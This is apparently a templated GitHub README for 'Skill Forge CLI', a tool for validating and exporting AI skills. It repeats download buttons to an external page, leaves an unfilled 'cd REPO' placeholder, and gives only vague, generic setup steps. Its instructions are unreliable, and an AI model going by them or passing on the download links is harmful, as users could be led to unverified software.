# Skill Forge CLI v2.0.0 - AI skill management tool 2026

> **Skill Forge CLI is a cross-platform command-line tool for validating, scrubbing, and publishing AI skills with versioned releases, multi-format exports, and an interactive workflow in version 2.0.0.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kellylogan63/skill-forge-skill-manager?style=flat-square)](https://github.com/kellylogan63/skill-forge-skill-manager)

---

<p align="center">
  <a href="https://kellylogan63.github.io/skill-forge-skill-manager/">
    <img src="https://img.shields.io/badge/Download-Skill%20Forge%20CLI%20Latest-brightgreen?style=for-the-badge" alt="Download Skill Forge CLI">
  </a>
</p>

> **[Direct Download - Skill Forge CLI v2.0.0](https://kellylogan63.github.io/skill-forge-skill-manager/)**

---

[Download Latest Build](https://kellylogan63.github.io/skill-forge-skill-manager/)

---

## Overview

Skill Forge CLI gives you a terminal-based way to handle AI skill content with an emphasis on validation, cleanup, and release preparation. It runs cross-platform and includes a responsive interactive interface, which makes it a fit for both routine publishing and automation-heavy workflows.

It is aimed at teams and solo builders working with Claude skill content, OpenAI-oriented exports, or custom output destinations. With secret scrubbing, channel guidance, and version-aware release handling, it keeps the publishing process structured without locking you into a single export path.

---

## What it can do

- Parse and validate skill content across common workflow needs
- Scrub secrets and credentials before export or release
- Export to multiple formats, including Claude, OpenAI, and custom destinations
- Suggest channels to help identify suitable publishing routes
- Handle versioned releases with changelog automation
- Run on different operating systems through a cross-platform CLI
- Provide a responsive interactive terminal UI for guided usage
- Support repeatable workflow automation for publishing tasks

---

## Installation

Clone the repository and install it in your preferred environment:

```bash
git clone https://github.com/kellylogan63/skill-forge-skill-manager.git
cd REPO
```

After cloning, install any required dependencies for your runtime, then launch the CLI from the project root. If the project provides a packaged entry command, run that first; otherwise start it with the local executable or script supplied by the repository.

---

## Usage

A typical flow looks like this:

1. Load a skill file or skill folder into the CLI.
2. Run validation to check structure and content.
3. Scrub secrets or credentials from the output set.
4. Choose an export target such as Claude, OpenAI, or a custom format.
5. Generate a versioned release and changelog when you are ready to publish.

Example workflow:

```bash
skill-forge validate ./skills/example
skill-forge scrub ./skills/example
skill-forge export --target claude ./skills/example
skill-forge release --version 2.0.0
```

If you are using the interactive mode, follow the on-screen prompts to pick the source, target format, and release options.

---

## Configuration

Depending on your installation, configuration usually lives in the project settings file or in the CLI's local workspace state. Store export destinations, publishing preferences, and release metadata wherever your setup expects them.

Example configuration structure:

```yaml
targets:
  - claude
  - openai
  - custom
release:
  changelog: true
  versioning: true
scrubbing:
  secrets: true
```

---

## Requirements

- Cross-platform system capable of running the CLI
- A supported command-line environment
- Storage for skill sources, exports, and release artifacts
- Access to any optional publishing destinations you configure
- Runtime or dependency setup matching the project instructions in the repository

---

## FAQ

**How do I get updates?**  
Visit the repository releases and download page to check the latest build and version changes.

**Can I change export targets?**  
Yes. The tool supports multi-format export, including Claude, OpenAI, and custom targets.

**Where do I configure publishing behavior?**  
Use the project configuration file or the local workspace settings used by your installation.

**What if validation fails?**  
Review the source skill content, fix the reported issues, and run validation again before exporting.

**Does it support automated release prep?**  
Yes. Versioned release handling and changelog automation are part of the workflow.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
